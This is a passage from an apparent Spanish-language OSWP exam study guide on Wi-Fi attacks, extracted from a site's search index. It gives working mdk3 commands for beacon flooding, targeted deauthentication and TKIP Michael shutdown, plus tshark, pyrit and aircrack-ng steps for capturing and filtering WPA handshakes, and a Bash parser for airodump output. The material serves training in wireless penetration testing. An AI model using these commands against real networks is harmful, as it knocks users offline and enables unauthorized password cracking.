SSID=MOVISTAR_1677\n    2 0.307210202 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677\n    3 0.614413670 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677\n    4 0.921614210 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677\n</code></pre> <p>La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros dispositivos necesitan poder recoger este tipo de paquetes y extraer la informaci\u00f3n necesaria para conectarse.</p> <p>A trav\u00e9s de la herramienta mdk3, podemos generar un ataque conocido como Beacon Flood Attack, generando mont\u00f3n de paquetes Beacon con informaci\u00f3n falsa. \u00bfQu\u00e9 conseguimos con esto?, pues bueno, uno de los ataques cl\u00e1sicos consistir\u00eda en generar montones de puntos de acceso situados en el mismo canal que un punto de acceso objetivo, logrando as\u00ed da\u00f1ar el espectro de onda de la red dej\u00e1ndola no operativa e invisible por los usuarios.</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #for i in $(seq 1 10); do echo \"MyNetwork$i\" &gt;&gt; redes.txt; done\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #cat redes.txt \nMyNetwork1\nMyNetwork2\nMyNetwork3\nMyNetwork4\nMyNetwork5\nMyNetwork6\nMyNetwork7\nMyNetwork8\nMyNetwork9\nMyNetwork10\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7\n</code></pre> <p>En este caso, estar\u00edamos generando un buen pu\u00f1ado de puntos de acceso con los ESSID listados en el archivo, todos ellos posicionados en el canal 7. Para los curiosos, el par\u00e1metro '-a' lo que se encarga es de anunciar redes WPA2, y el par\u00e1metro '-s' establece la velocidad de los paquetes emitidos por segundo, que por defecto est\u00e1n establecidos a 50.</p> <p>Por si quer\u00e9is ver c\u00f3mo se ver\u00eda todo desde un dispositivo tercero que trata de escanear o listar los puntos de acceso disponibles en el entorno:</p> <p></p> <p>De hecho, hasta si quer\u00e9is causar curiosidad en el ambiente, si corr\u00e9is este modo de ataque con mdk3 sin especificar par\u00e1metros:</p> <ul> <li>mdk3 wlan0mon b</li> </ul> <p>Estar\u00edamos generando puntos de acceso con ESSID's aleatorios:</p> <p></p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#disassociation-amok-mode-attack","title":"Disassociation Amok Mode Attack","text":"<p>Realmente esto no deja de parecerse a un ataque de de-autenticaci\u00f3n dirigido, pero por cultura, mdk3 cuenta con unos modos de operaci\u00f3n de tipo Black List/White List, desde los cuales podemos especificar qu\u00e9 clientes queremos que no sean deautenticados del AP, a\u00f1adiendo a los mismos en un White List y viceversa.</p> <p>Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los cuales queremos de-autenticar del AP. Posteriormente, corremos mdk3 especificando el modo de ataque y el canal en el que se encuentra la red:</p> <p></p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#michael-shutdown-exploitation","title":"Michael Shutdown Exploitation","text":"<p>Tal y como dice la propia descripci\u00f3n de la utilidad:</p> <p><code>\"Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets\"</code></p> <p>Es decir, podemos llegar a apagar un router a trav\u00e9s de este ataque. </p> <p>ANOTACI\u00d3N: En la pr\u00e1ctica, no es muy efectivo.</p> <p>La sintaxis ser\u00eda la siguiente:</p> <ul> <li>mdk3 wlan0mon m -t bssidAP</li> </ul>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tecnicas-pasivas","title":"T\u00e9cnicas Pasivas","text":"<p>Todo lo visto hasta el momento, requiere de la intervenci\u00f3n por nuestra parte en el lado del atacante. </p> <p>Tendr\u00edamos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y tener paciencia. </p> <p>Podr\u00edamos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala se\u00f1al, se desconecte y reasocie autom\u00e1ticamente sin nosotros tener que hacer nada. Podr\u00edamos quedarnos esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al AP. Se podr\u00eda hacer de mont\u00f3n de maneras distintas.</p> <p>Lo importante de todo esto es, que el Handshake, no tiene por qu\u00e9 generarse en base a la reautenticaci\u00f3n del cliente a la red pero s\u00f3lo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda relaci\u00f3n alguna con el ataque de de-autenticaci\u00f3n para forzar al cliente a que se reconecte a la red.</p> <p>Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por nuestros medios activos o sin hacer nada a voluntad de la calidad de la se\u00f1al entre la estaci\u00f3n y el AP, o por el propio cliente que se ha vuelto a reconectar por 'X' razones.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#validacion-del-handshake-con-pyrit","title":"Validaci\u00f3n del Handshake con Pyrit","text":"<p>Hasta ahora hemos visto t\u00e9cnicas para capturar un Handshake. Ahora bien, en ocasiones, puede suceder que la suite de aircrack-ng nos diga que ha capturado un Handshake cuando realmente no es as\u00ed, no ser\u00eda la primera vez que me ha llegado a suceder.</p> <p>\u00bfQu\u00e9 mejor que validar la captura con otra herramienta?, con pyrit. Pyrit es una herramienta bestial para el cracking, an\u00e1lisis de capturas y monitorizado de redes inal\u00e1mbricas. Uno de los modos de los que dispone, es de una especie de 'checker', con el cual podemos analizar la captura para ver si esta cuenta con un Handshake o no.</p> <p>Por ejemplo, imaginemos que hemos capturado un supuesto Handshake de una red inal\u00e1mbrica, o al menos eso vemos desde aircrack-ng. Si quisi\u00e9ramos ahora validarlo desde Pyrit, har\u00edamos lo siguiente sobre la captura '.cap':</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -r Captura-01.cap analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'Captura-01.cap' (1/1)...\nParsed 2 packets (2 802.11-packets), got 1 AP(s)\n\n#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):\nNo valid EAOPL-handshake + ESSID detected.\n</code></pre> <p>Como vemos, 'No valid EAOPL-handshake + ESSID detected.', por lo que la captura no cuenta con ning\u00fan Handshake.</p> <p>Veamos ahora un caso donde s\u00ed nos reporta que la captura cuenta con un Handshake v\u00e1lido:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -r Captura-02.cap analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'Captura-02.cap' (1/1)...\nParsed 63 packets (63 802.11-packets), got 1 AP(s)\n\n#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):\n  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):\n    #1: HMAC_SHA1_AES, good*, spread 1\n</code></pre> <p>Tal y como se puede observar, la red hacklab cuenta con un Handshake generado por parte de la estaci\u00f3n 34:41:5d:46:d1:38, lo cual incluso nos viene de maravilla, porque as\u00ed tenemos una traza de todo lo referente a dicha captura, incluido el nombre de la red inal\u00e1mbrica en caso de que el nombre de nuestra captura no identifique al AP.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tratamiento-y-filtro-de-la-captura","title":"Tratamiento y filtro de la captura","text":"<p>Cabe decir que a la hora de capturar un Handshake, capturamos tal vez m\u00e1s de lo que necesitamos durante el tiempo de espera. La captura final, puede ser tratada para extraer simplemente la informaci\u00f3n m\u00e1s relevante del AP, que ser\u00eda el eapol.</p> <p>Con la herramienta tshark, podemos generar una nueva captura filtrando \u00fanicamente los paquetes que nos interesa de la captura previamente realizada:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"eapol\" 2&gt;/dev/null\n   34   7.903744 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)\n   36   7.907316 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)\n   40   7.912448 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)\n   42   7.914483 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"eapol\" 2&gt;/dev/null -w filteredCapture\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -r filteredCapture analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'filteredCapture' (1/1)...\nParsed 4 packets (4 802.11-packets), got 1 AP(s)\n\n#1: AccessPoint 20:34:fb:b1:c5:53 ('None'):\n  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):\n    #1: HMAC_SHA1_AES, good, spread 1\nNo valid EAOPL-handshake + ESSID detected.\n</code></pre> <p>Y como vemos, nos sigue notificando de que hay 1 Handshake v\u00e1lido por parte de la estaci\u00f3n especificada. Sin embargo, vemos que ahora en el campo 'ESSID' de la red nos pone None. Esto es as\u00ed dado que el campo eapol no guarda ese tipo de informaci\u00f3n. </p> <p>Ahora es cuando recapitulamos, \u00bfqu\u00e9 tipo de paquete es el que guarda esa informaci\u00f3n?... exacto, los paquetes Beacon, por tanto podemos ajustar un poco m\u00e1s nuestro filtro para seguir desechando paquetes no necesarios pero filtrando algo m\u00e1s de informaci\u00f3n en lo referente a nuestro AP v\u00edctima, haciendo uso para ello del operador OR:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"wlan.fc.type_subtype==0x08 || eapol\" 2&gt;/dev/null\n    1   0.000000 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab\n   34   7.903744 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)\n   36   7.907316 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)\n   40   7.912448 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)\n   42   7.914483 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)\n</code></pre> <p>En este caso, vemos que ha habido un paquete Beacon capturado, indicando el nombre del ESSID al final de la primera l\u00ednea.</p> <p>Si exportamos dicha captura y analizamos ahora desde Pyrit:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"wlan.fc.type_subtype==0x08 || eapol\" 2&gt;/dev/null -w filteredCapture\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -r filteredCapture analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'filteredCapture' (1/1)...\nParsed 5 packets (5 802.11-packets), got 1 AP(s)\n\n#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):\n  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):\n    #1: HMAC_SHA1_AES, good, spread 1\n</code></pre> <p>El campo 'None' es sustituido por el ESSID de la red. </p> <p>ANOTACI\u00d3N: En mi opini\u00f3n, recomiendo hacer uso del siguiente filtrado para este tipo de casos, donde adem\u00e1s de los paquetes Beacon es preferible filtrar tambi\u00e9n por los paquetes Probe Response.</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol\" 2&gt;/dev/null\n    1   0.000000 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab\n    3   0.374849 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab\n    5   0.586817 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    6   0.590400 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    7   0.594497 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    8   0.596543 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n    9   0.600640 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n   10   0.602688 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n   11   0.605759 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n   12   0.610367 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n   13   4.188928 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab\n   34   7.903744 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)\n   36   7.907316 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)\n   40   7.912448 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)\n   42   7.914483 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)\n  112   8.252481 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n  113   8.259649 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n  114   8.261696 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab\n  115   8.272449 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n</code></pre> <p>Otra buena pr\u00e1ctica y consejo es acostumbrarnos a hacer estas filtraciones indicando el BSSID de la red objetivo, as\u00ed evitamos confusiones y estar filtrando paquetes que no corresponden.</p> <p>Para este caso, como sabemos que la direcci\u00f3n MAC del AP es 20:34:fb:b1:c5:53 (lo podemos ver desde Pyrit), una buena pr\u00e1ctica ser\u00eda hacer lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" 2&gt;/dev/null\n    1   0.000000 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab\n    3   0.374849 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab\n    5   0.586817 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    6   0.590400 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    7   0.594497 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n    8   0.596543 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n    9   0.600640 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n   10   0.602688 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n   11   0.605759 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab\n   12   0.610367 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab\n   13   4.188928 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab\n   34   7.903744 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)\n   36   7.907316 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)\n   40   7.912448 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)\n   42   7.914483 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)\n  112   8.252481 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n  113   8.259649 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n  114   8.261696 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab\n  115   8.272449 XiaomiCo_b1:c5:53 \u2192 HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab\n</code></pre> <p>Por \u00faltimo y para que no os asust\u00e9is, fijaros qu\u00e9 curioso:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -Y \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -w filteredCapture 2&gt;/dev/null\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #aircrack-ng filteredCapture \nOpening filteredCapture wait...\nUnsupported file format (not a pcap or IVs file).\nRead 0 packets.\n\nNo networks found, exiting.\n\n\nQuitting aircrack-ng...\n</code></pre> <p>La suite de aircrack-ng, deber\u00eda ser capaz de distinguirnos el punto de acceso y el Handshake capturado, hemos visto que Pyrit lo detecta sin problemas, \u00bfpor qu\u00e9 aircrack no?, la respuesta es sencilla. A la hora de exportar la captura desde tshark, si queremos que aircrack nos lo interprete, debemos de especificar en el modo de exportaci\u00f3n para la captura el formato pcap, de la siguiente forma:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-02.cap -R \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -2 -w filteredCapture -F pcap 2&gt;/dev/null\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #aircrack-ng filteredCapture \nOpening filteredCapture wait...\nRead 19 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)\n\nChoosing first network as target.\n\nOpening filteredCapture wait...\nRead 19 packets.\n\n1 potential targets\n</code></pre> <p>Destacar que he hecho uso del par\u00e1metro '-R' en vez del '-Y' porque estoy haciendo uso del par\u00e1metro '-2', con el objetivo de hacer un doble pase durante la fase de an\u00e1lisis. Esta opci\u00f3n es incluso mejor, dado que se recopilan las anotaciones. El uso del par\u00e1metro '-R' requiere de forma obligatoria que a\u00f1adamos el par\u00e1metro '-2'.</p> <p>Os dejo por aqu\u00ed una peque\u00f1a aclaratoria de la utilidad de estos par\u00e1metros: Inter\u00e9s</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#parseador-para-redes-del-entorno","title":"Parseador para redes del entorno","text":"<p>Hasta ahora hemos estado parseando redes espec\u00edficas, pero, \u00bfno te has parado a pensar en que tambi\u00e9n podr\u00edamos hacer esto?:</p> <ul> <li>airodump-ng wlan0mon -w Captura</li> </ul> <p>Es decir, capturar todo el tr\u00e1fico de todas las redes disponibles en el entorno en un fichero. \u00bfPor qu\u00e9 \u00edbamos a querer hacer esto?, bueno, desde airodump-ng, en el momento de escanear las redes del entorno, lo vemos todo claro, bien representado, sin embargo, una vez las evidencias son exportadas al fichero especificado, ya la manera de representar los datos no son los mismos.</p> <p>Por ello, os comparto el siguiente script en Bash:</p> <pre><code>#!/bin/bash\n\nif [[ \"$1\" &amp;&amp; -f \"$1\" ]]; then\n    FILE=\"$1\"\nelse\n    echo -e '\\nEspecifica el fichero .csv a analizar\\n';\n    echo 'Uso:';\n    echo -e \"\\t./parser.sh Captura-01.csv\\n\";\n    exit  \nfi\n\ntest -f oui.txt 2&gt;/dev/null\n\nif [ \"$(echo $?)\" == \"0\" ]; then\n\n    echo -e \"\\n\\033[1mN\u00famero total de puntos de acceso: \\033[0;31m`grep -E '([A-Za-z0-9._: @\\(\\)\\\\=\\[\\{\\}\\\"%;-]+,){14}' $FILE | wc -l`\\e[0m\"\n    echo -e \"\\033[1mN\u00famero total de estaciones: \\033[0;31m`grep -E '([A-Za-z0-9._: @\\(\\)\\\\=\\[\\{\\}\\\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE | wc -l`\\e[0m\"\n    echo -e \"\\033[1mN\u00famero total de estaciones no asociadas: \\033[0;31m`grep -E '(not associated)' $FILE | wc -l`\\e[0m\"\n\n    echo -e \"\\n\\033[0;36m\\033[1mPuntos de acceso disponibles:\\e[0m\\n\"\n\n    while read -r line ; do\n\n        if [ \"`echo \"$line\" | cut -d ',' -f 14`\" != \" \" ]; then\n            echo -e \"\\033[1m\" `echo -e \"$line\" | cut -d ',' -f 14` \"\\e[0m\"\n        else\n            echo -e \" \\e[3mNo es posible obtener el nombre de la red (ESSID)\\e[0m\"\n        fi\n\n        fullMAC=`echo \"$line\" | cut -d ',' -f 1`\n        echo -e \"\\tDirecci\u00f3n MAC: $fullMAC\"\n\n        MAC=`echo \"$fullMAC\" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`\n\n        result=\"$(grep -i -A 1 ^$MAC ./oui.txt)\";\n\n        if [ \"$result\" ]; then\n            echo -e \"\\tVendor: `echo \"$result\" | cut -f 3`\"\n        else\n            echo -e \"\\tVendor: \\e[3mInformaci\u00f3n no encontrada en la base de datos\\e[0m\"\n        fi\n\n        is5ghz=`echo \"$line\" | cut -d ',' -f 4 | grep -i -E '36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'`\n\n        if [ \"$is5ghz\" ]; then\n            echo -e \"\\t\\033[0;31mOpera en 5 GHz!\\e[0m\"\n        fi\n\n        printonce=\"\\tEstaciones:\"\n\n        while read -r line2 ; do\n\n            clientsMAC=`echo $line2 | grep -E \"$fullMAC\"`\n            if [ \"$clientsMAC\" ]; then\n\n                if [ \"$printonce\" ]; then\n                    echo -e $printonce\n                    printonce=''\n                fi\n\n                echo -e \"\\t\\t\\033[0;32m\" `echo $clientsMAC | cut -d ',' -f 1` \"\\e[0m\"\n                MAC2=`echo \"$clientsMAC\" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`\n\n                result2=\"$(grep -i -A 1 ^$MAC2 ./oui.txt)\";\n\n                if [ \"$result2\" ]; then\n                    echo -e \"\\t\\t\\tVendor: `echo \"$result2\" | cut -f 3`\"\n                    ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`\n                    warning=`echo $result2 | grep -i -E 'ALFA|Intel'`\n                    if [ \"$ismobile\" ]; then\n                        echo -e \"\\t\\t\\t\\033[0;33mEs probable que se trate de un dispositivo m\u00f3vil\\e[0m\"\n                    fi\n\n                    if [ \"$warning\" ]; then\n                        echo -e \"\\t\\t\\t\\033[0;31;5;7mEl dispositivo soporta el modo monitor\\e[0m\"\n                    fi\n\n                else\n                    echo -e \"\\t\\t\\tVendor: \\e[3mInformaci\u00f3n no encontrada en la base de datos\\e[0m\"\n                fi\n\n                probed=`echo $line2 | cut -d ',' -f 7`\n\n                if [ \"`echo $probed | grep -E [A-Za-z0-9_\\\\-]+`\" ]; then\n                    echo -e \"\\t\\t\\tRedes a las que el dispositivo ha estado asociado: $probed\"\n                fi        \n            fi\n        done &lt; &lt;(grep -E '([A-Za-z0-9._: @\\(\\)\\\\=\\[\\{\\}\\\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE)\n\n    done &lt; &lt;(grep -E '([A-Za-z0-9._: @\\(\\)\\\\=\\[\\{\\}\\\"%;-]+,){14}' $FILE)\n\n    echo -e \"\\n\\033[0;36m\\033[1mEstaciones no asociadas:\\e[0m\\n\"\n\n    while read -r line2 ; do\n\n        clientsMAC=`echo $line2  | cut -d ',' -f 1`\n\n        echo -e \"\\033[0;31m\" `echo $clientsMAC | cut -d ',' -f 1` \"\\e[0m\"\n        MAC2=`echo \"$clientsMAC\" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`\n\n        result2=\"$(grep -i -A 1 ^$MAC2 ./oui.txt)\";\n\n        if [ \"$result2\" ]; then\n            echo -e \"\\tVendor: `echo \"$result2\" | cut -f 3`\"\n            ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`\n            warning=`echo $result2 | grep -i -E 'ALFA|Intel'`\n            if [ \"$ismobile\" ]; then\n                echo -e \"\\t\\033[0;33mEs probable que se trate de un dispositivo m\u00f3vil\\e[0m\"\n            fi\n            if [ \"$warning\" ]; then\n                echo -e \"\\t\\033[0;31;5;7mEl dispositivo soporta el modo monitor\\e[0m\"\n            fi\n        else\n            echo -e \"\\tVendor: \\e[3mInformaci\u00f3n no encontrada en la base de datos\\e[0m\"\n        fi\n\n        probed=`echo $line2 | cut -d ',' -f 7`\n\n        if [ \"`echo $probed | grep -E [A-Za-z0-9_\\\\-]+`\" ]; then\n            echo -e \"\\tRedes a las que el dispositivo ha estado asociado: $probed\"\n        fi        \n\n    done &lt; &lt;(grep -E '(not associated)' $FILE)\nelse\n    echo -e \"\\n[!] Archivo oui.txt no encontrado, desc\u00e1rgalo desde aqu\u00ed: http://standards-oui.ieee.org/oui/oui.txt\\n\"\nfi\n</code></pre> <p>Aprovechando el fichero '.csv' generado autom\u00e1ticamente tras correr airodump sobre la red objetivo, podemos hacer uso de este parseador para representar toda la informaci\u00f3n de los datos capturados.</p> <p>Correr el script es bastante sencillo:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #./file.sh \n\nEspecifica el fichero .csv a analizar\n\nUso:\n    ./parser.sh Captura-01.csv\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #./file.sh captura-01.csv \n\n[!] Archivo oui.txt no encontrado, 